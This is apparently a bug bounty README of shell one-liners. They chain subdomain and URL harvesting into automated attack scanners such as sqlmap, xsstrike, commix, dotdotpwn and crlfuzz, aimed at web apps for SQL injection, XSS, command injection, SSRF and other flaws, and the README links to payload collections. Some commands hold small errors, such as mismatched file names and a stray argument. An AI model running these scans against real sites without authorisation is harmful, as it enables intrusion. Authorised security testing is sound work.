# BugBountyToolBox

- `bbp-setup.sh`: A script to setup your bug bounty tool.
    ```sh
    chmod +x bbp-setup.sh
    ./bbp-setup.sh
    ```

- `bbp-recon.sh`: A script to automate the recon process.
    ```sh
    chmod +x bbp-recon.sh
    ./bbp-recon.sh [domain | /path/to/domains.txt | /path/to/asset.txt]
    ```

## One-liners

### Directory Transversal

```sh
dotdotpwn.pl -m http -h $domain
```

### SQL Injection

```sh
# subfinder + gau(or waybackurls) + urldedupe(or sort -u) + gf sqli + sqlmap
subfinder -d $domain -all --silent | gau | urldedupe | gf sqli > sql.txt; 
sqlmap -m sql.txt --batch --dbs --risk 2 --level 5 --random-agent | tee -a sqli.txt

# improved script
subfinder -d $domain -all --silent | \
xargs -I@ -P 10 sh -c 'gau @ | urldedupe | gf sqli' > sqli.txt;
sqlmap -m sql.txt --batch --dbs --risk 2 --level 5 --random-agent 2 | tee -a sqli.txt
```
- Burp Intruder Payloads
    - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection/Intruder](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection/Intruder)

### Cross-Site Scripting (XSS)

```sh
# subfinder + gau(or waybackurls) + urldedupe(or sort -u) + gf xss + xssstrike
subfinder -d $domain -all --silent | gau | urldedupe | gf xss | tee -a xss.txt; 
python3 xsstrike.py -u $url # url in xss.txt

# improved script
subfinder -d $domain -all --silent | \
xargs -I@ -P 10 sh -c 'gau @ | urldedupe | gf xss' > xss.txt;
python3 xsstrike.py -u $url # url in xss.txt
```

- Burp Intruder Payloads
    - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection/Intruders)

### Command Injection

```sh
subfinder -d $domain -all --silent | waybackurls | sort -u | grep "?*=" | tee -a cmd.txt
python3 commix.py -u $subdomain --batch

# improved script
subfinder -d $domain -all --silent | \
xargs -I@ -P 10 sh -c 'waybackurls @ | urldedupe | grep "?*=" > cmd.txt';
python3 commix.py -u $subdomain --batch
```

### HTTP Header Injection (HTML Injection and Content Spoofing)

```sh
headi -u $subdomain
```

### Template Injection

```sh
# subfinder + gau(or waybackurls) + urldedupe(or sort -u) + gf ssti
subfinder -d $domain -all --silent | gau | urldedupe | gf ssti > ssti.txt

# improved script
subfinder -d $domain -all --silent | \
xargs -I@ -P 10 sh -c 'gau @ | urldedupe | gf ssti' > ssti.txt
```

### Server-Side Request Forgery (SSRF)

```sh
# subfinder + gau(or waybackurls) + urldedupe(or sort -u) + gf ssrf
subfinder -d $domain -all --silent | gau | urldedupe | gf ssrf >> ssrf.txt

# improved script
subfinder -d $domain -all --silent | \
xargs -I@ -P 10 sh -c 'gau @ | urldedupe | gf ssrf' >> ssrf.txt
```

### File Inclusion

```sh
# subfinder + gau(or waybackurls) + urldedupq(or sort -u) + gf lfi
subfinder -d $domain -all --silent | gau | urldedupe | gf lfi >> lfi.txt

# improved script
subfinder -d $domain -all --silent | \
xargs -I@ -P 10 sh -c 'gau @ | urldedupe | gf lfi' >> lfi.txt
```

### Unvalidated Redirects and Forwards (Open Redirect)

```sh
# subfinder + gau(or waybackurls) + urldedupe(or sourt -u) + gf redirect
subfinder -d $domain -all --silent | gau | urldedupe | gf redirect | openredirex >> openrs.txt

# improved script
subfinder -d $domain -all --silent | \
xargs -I@ -P 10 sh -c 'gau @ | urldedupe | gf redirect | openredirex' >> openrs.txt
```

### Subdomain-Takeover Vulnerability

```sh
subzy run --target $domain
subzy run --target urls.txt
```

### IDOR (Broken Access Control)

```sh
# subfinder + gau(or waybackurls) + urldedupe(or sort -u) + gf idor
subfinder -d $domain -all --silent | gau | urldedupe | gf idor >> urls.txt

# improved script
subfinder -d $domain -all --silent | \
xargs -I@ -P 10 sh -c 'gau @ | urldedupe | gf idor' >> idor.txt
```

### Using Known Vulnerable Components

```sh
nmap -T4 -sV --script vulners $ip
```

### Security Misconfiguration

```sh
# subfinder + gau(or waybackurls) + urldedupe(or sort -u) + gf cors
subfinder -d $domain -all --silent | gau | urldedupe | gf cors >> cors.txt
python3 cors.py -i cors.txt

# improved script
subfinder -d $domain -all --silent | \
xargs -I@ -P 10 sh -c 'gau @ | urldedupe | gf cors' >> cors.txt;
python3 cors.py -i cors.txt
```

### Remote Code Execution

```sh
# subfinder + gau(or waybackurls) + urldedupe(or sort -u) + gf rce
subfinder -d $domain -all --silent | gau | urldedupe | gf rce >> rce.txt

# improved script
subfinder -d $domain -all --silent | \
xargs -I@ -P 10 sh -c 'gau @ | urldedupe | gf rce' >> rce.txt
```

### HTTP Request Smuggling

```sh
python3 smuggler.py -u $urls
```

### CRLF Injection

```sh
crlfuzz -u $url
crlfuzz -l urls.txt
```

## Further Reading

- [https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

- [https://github.com/thecybertix/One-Liner-Collections](https://github.com/thecybertix/One-Liner-Collections)

- [https://github.com/1ndianl33t/Bug-Bounty-Roadmaps](https://github.com/1ndianl33t/Bug-Bounty-Roadmaps)

- [https://github.com/KingOfBugbounty/KingOfBugBountyTips](https://github.com/KingOfBugbounty/KingOfBugBountyTips)

- [https://github.com/reddelexc/hackerone-reports](https://github.com/reddelexc/hackerone-reports)